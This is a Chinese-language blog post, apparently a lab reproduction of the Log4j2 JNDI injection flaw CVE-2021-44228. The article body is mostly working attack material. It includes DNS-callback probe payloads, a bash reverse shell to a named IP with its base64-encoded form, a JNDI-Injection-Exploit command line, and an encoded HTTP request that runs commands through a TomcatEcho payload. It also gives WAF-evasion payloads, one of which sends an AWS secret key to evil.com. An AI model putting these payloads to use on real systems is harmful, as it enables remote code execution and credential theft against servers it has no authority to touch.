@@ -1,0 +1,309 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>cve-2021-44228-Log4j2 | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="cve-2021-44228-Log4j2 利用到的工具  JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  JNDIExploit-2.0-SNAPSHOT.jar 一台vps    log4j2 cve-2021-44228 利用 ##### 探测是否存在漏洞  先获取一个DNS的地址 123456#探测是否存在漏洞$&#123;jndi:ldap:&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cve-2021-44228-Log4j2">
+<meta property="og:url" content="https://hundredsu.github.io/post/f9f48cab.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="cve-2021-44228-Log4j2 利用到的工具  JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar  JNDIExploit-2.0-SNAPSHOT.jar 一台vps    log4j2 cve-2021-44228 利用 ##### 探测是否存在漏洞  先获取一个DNS的地址 123456#探测是否存在漏洞$&#123;jndi:ldap:&#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-04-05T08:35:07.000Z">
+<meta property="article:modified_time" content="2025-04-05T08:48:03.552Z">
+<meta property="article:author" content="Hundredsu">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "cve-2021-44228-Log4j2",
+  "url": "https://hundredsu.github.io/post/f9f48cab.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-04-05T08:35:07.000Z",
+  "dateModified": "2025-04-05T08:48:03.552Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hundredsu.github.io/post/f9f48cab.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'cve-2021-44228-Log4j2',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">cve-2021-44228-Log4j2</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">cve-2021-44228-Log4j2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-05T08:35:07.000Z" title="发表于 2025-04-05 16:35:07">2025-04-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-05T08:48:03.552Z" title="更新于 2025-04-05 16:48:03">2025-04-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="cve-2021-44228-Log4j2"><a href="#cve-2021-44228-Log4j2" class="headerlink" title="cve-2021-44228-Log4j2"></a>cve-2021-44228-Log4j2</h1><blockquote>
+<p>利用到的工具</p>
+<ul>
+<li><p>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
+</li>
+<li><p>JNDIExploit-2.0-SNAPSHOT.jar</p>
+<p>一台vps</p>
+</li>
+</ul>
+</blockquote>
+<h2 id="IwaAp">log4j2</h2>
+<h3 id="Lee0K">cve-2021-44228</h3>
+<h4 id="h1mce">利用</h4>
+##### 探测是否存在漏洞
+
+<p>先获取一个DNS的地址</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#探测是否存在漏洞</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">123.7</span>k8ovf.ceye.io&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取版本</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="variable">$</span>&#123;sys:java.version&#125;.<span class="number">7</span>k8ovf.ceye.io&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/1.png"></p>
+<p><img src="/img/cve-2021-44228-Log4j2/2.png"></p>
+<p>dns平台回显</p>
+<p><img src="/img/cve-2021-44228-Log4j2/3.png"></p>
+<p>java版本为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.8.0_312</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>在vps开个监听</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/4.png"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">47.113</span>.<span class="number">229.136</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/cve-2021-44228-Log4j2/5.png"></p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE&#x3D;</p>
+<p>base64编码一下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-jar</span> JNDI<span class="literal">-Injection-Exploit-1</span>.<span class="number">0</span><span class="literal">-SNAPSHOT-all</span>.jar <span class="literal">-C</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="literal">-A</span> <span class="string">&quot;47.113.229.136&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/6.png"></p>
+<p>由于版本为1.8</p>
+<p>所以选择</p>
+<p>ldap:&#x2F;&#x2F;47.113.229.136:1389&#x2F;hozkka</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/hozkka&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/7.png"></p>
+<p>记得把服务器的安全组规则弄一下</p>
+<p>端口开放一下</p>
+<p><img src="/img/cve-2021-44228-Log4j2/8.png"></p>
+<p>应该能弹shell成功的 但是太卡了</p>
+<p>这里是用的在线靶场</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/TomcatBypass/TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /hello?payload=%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">6</span>a%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">6</span>c%<span class="number">64</span>%<span class="number">61</span>%<span class="number">70</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">34</span>%<span class="number">37</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">31</span>%<span class="number">33</span>%<span class="number">2</span>e%<span class="number">32</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">39</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">42</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">45</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">7</span>d HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">20060</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">134.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">11324</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">cmd: <span class="built_in">ls</span> /tmp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/9.png"></p>
+<h4 id="o78IB">绕waf</h4>
+<h5 id="WCjBO">Log4j2混淆绕过waf/流量特征</h5>
+[Log4j一些WAF绕过技巧 - websec80 - 博客园](https://www.cnblogs.com/websec80/p/17876672.html)
+
+<h6 id="suFLP">利用 Lookup 语法变形</h6>
+1.可以使用 :- 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字
+
+<blockquote>
+<p><code>:-</code> 的作用是用来指定一个默认值。当 lookup 函数找不到指定的变量或值时，它会返回 <code>:-</code> 后面指定的默认值。</p>
+</blockquote>
+<p>s[:::::-j)${what:-n}${ls:-d}${1QAZ2wxs:-i}</p>
+<p>${j${sdasd:-n}d${sddd:-i}:ldap:&#x2F;&#x2F;dns.log}</p>
+<h6 id="Q6StV">环境变量与系统属性注入</h6>
+**环境变量读取**：利用 `env` Lookup 动态构造 Payload，例如：
+
+<ul>
+<li>java复制</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://evil.com/z?leak=$&#123;env:AWS_SECRET_ACCESS_KEY&#125;&#125;</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi:$&#123;env:ENV_NAME:-l&#125;dap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过读取环境变量或动态拼接绕过静态检测7。</p>
+<p><strong>系统属性注入</strong>：利用 <code>sys</code> Lookup 构造动态协议：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;sys:SYS_NAME:<span class="literal">-i</span>&#125;:ldap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若系统属性 <code>SYS_NAME</code> 不存在，则默认使用 <code>i</code> 补全7。</p>
+<p>2.虽然除了JNDI之外的核心包里的Lookup不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步操作</p>
+<h6 id="OJY3U">解析绕过</h6>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">#evil.com/z&#125;  // 利用 `#` 分割主机名</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span>`/Exploit&#125;    // 使用反引号触发 URI 解析错误</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;<span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;a&quot;</span>:<span class="string">&quot;a:-i&#125;:ld<span class="variable">$</span>&#123;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;next&quot;</span>: <span class="string">&quot;o:-a&#125;p://evil.com/z&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/f9f48cab.html">https://hundredsu.github.io/post/f9f48cab.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/post/633b4305.html" title="红日1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">红日1</div></div><div class="info-2"><div class="info-item-1">环境搭建 安装好三台靶机    默认密码为 hongrisec@2019 配置两张网卡  NAT和vm1   查看网卡配置成功 配置kali（vps） 一张网卡，NAT模拟公网  192.168.5.129 配置win7（web服务器跳板机） (NAT、VMnet1- 52.0/24)    改密码为hongrisec@2025 首次登录成功后，需要进行重启，否则phpstudy可能启动不了   配置成功 cmd检查一下，如果这里没显示两个不同网段的ip，那么就去修改网卡，直到成功为止 这里注意 第一个网卡固定为192.168.52.0&#x2F;24 所以将网卡2改为NAT以模拟外网   域内主机 Win2k3（VMnet3- 52.141） 显示要修改密码  修改为hongrisec@2025   域控 Server 2008 R2（VMnet3 - 52.138） 同样需要修改密码  修改为hongrisec@2025  环境 同下...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>关注我</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cve-2021-44228-Log4j2"><span class="toc-number">1.</span> <span class="toc-text">cve-2021-44228-Log4j2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IwaAp"><span class="toc-number">1.1.</span> <span class="toc-text">log4j2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lee0K"><span class="toc-number">1.1.1.</span> <span class="toc-text">cve-2021-44228</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#h1mce"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getshell"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#o78IB"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">绕waf</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WCjBO"><span class="toc-number">1.1.1.2.1.</span> <span class="toc-text">Log4j2混淆绕过waf&#x2F;流量特征</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#suFLP"><span class="toc-number">1.1.1.2.1.1.</span> <span class="toc-text">利用 Lookup 语法变形</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Q6StV"><span class="toc-number">1.1.1.2.1.2.</span> <span class="toc-text">环境变量与系统属性注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#OJY3U"><span class="toc-number">1.1.1.2.1.3.</span> <span class="toc-text">解析绕过</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/f9f48cab.html" title="cve-2021-44228-Log4j2">cve-2021-44228-Log4j2</a><time datetime="2025-04-05T08:35:07.000Z" title="发表于 2025-04-05 16:35:07">2025-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/633b4305.html" title="红日1">红日1</a><time datetime="2025-04-05T08:24:14.000Z" title="发表于 2025-04-05 16:24:14">2025-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4d6b513d.html" title="111">111</a><time datetime="2025-03-02T12:24:15.000Z" title="发表于 2025-03-02 20:24:15">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/bdae0d9b.html" title="自我介绍">自我介绍</a><time datetime="2025-03-02T12:12:26.000Z" title="发表于 2025-03-02 20:12:26">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4a17b156.html" title="Hello World">Hello World</a><time datetime="2025-03-02T11:12:50.360Z" title="发表于 2025-03-02 19:12:50">2025-03-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Hundredsu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.4</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
